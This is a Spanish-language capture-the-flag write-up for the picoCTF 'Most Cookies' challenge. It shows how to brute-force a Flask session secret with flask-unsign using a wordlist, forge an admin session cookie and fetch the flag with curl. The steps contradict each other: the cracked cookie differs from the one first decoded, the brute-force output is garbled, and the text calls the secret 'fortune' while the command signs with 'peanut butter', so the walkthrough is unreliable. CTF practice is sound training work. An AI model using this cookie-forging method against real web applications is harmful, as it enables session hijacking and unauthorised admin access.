## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py) [http://mercury.picoctf.net:53700/](http://mercury.picoctf.net:53700/)
## Solución
primero con wget descargamos el servidor luego nos dirigimos a la pagina
como dice el reto ponemos el nombre de una cookie en la caja de texto de la pagina.
![[Pasted image 20250930154329.png]]
con la extencion de cookie editor verificamos existe una cookie llamada session.
```
eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aNxatg.YNMLIQRFQpMZ6sGWFtEb_DEmYt8
```
con echo la desencriptamos en base 64 -d
```
{"very_auth":"snickerdoodle"}base64: entrada inválida

```
crakeamos la cookie usando una lista de palabras pero para ello tomamos las palabras del archivo servidor.py y las guardamos en un archivo llamado cookies.txt asi quedaria
```
└─$ cat cookies.txt 
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia

```
despues usamos unos comandos para iniciar el entorno virtual de python y instalar la librería flask-unsign
```python
python -m venv ~/.venv
source ~/.venv/bin/activate
pip3 install flask-unsign
```

crakeamos usando una lista de palabras con el archivo cookies.txt con el comando flask y la cookie session.
```
┌──(.venv)─(diego㉿Maquina-deGuerra)-[~/Documentos]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJsZWJrdWNoZW4ifQ.aNqzBQ.LuGrY1EjTtEFnx54gdfxPR996_s" --wordlist cookies.txt                    
[*] Session decodes to: {'very_auth': 'lebkuchen'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
```
despues creamos nuestra cookie con la firma fortune
```
┌──(.venv)─(diego㉿Maquina-deGuerra)-[~/Documentos]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'                                                                          
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNxbFw.kGjpTZQbjf8ztDajbTvtjL0uld0

```
revisamos la pagina si la cookie creada esta bien ademas usamos un grep para encontrar la bandera.
```
┌──(.venv)─(diego㉿Maquina-deGuerra)-[~/Documentos]
└─$ curl -s http://mercury.picoctf.net:53700/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNxbFw.kGjpTZQbjf8ztDajbTvtjL0uld0" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_3646b931}</code></p>

```
y listo obtuvimos la bandera
## Referencias
flask-insugn [Paradoxis/Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys.](https://github.com/Paradoxis/Flask-Unsign)

cookei editor (extebsion de navegadores)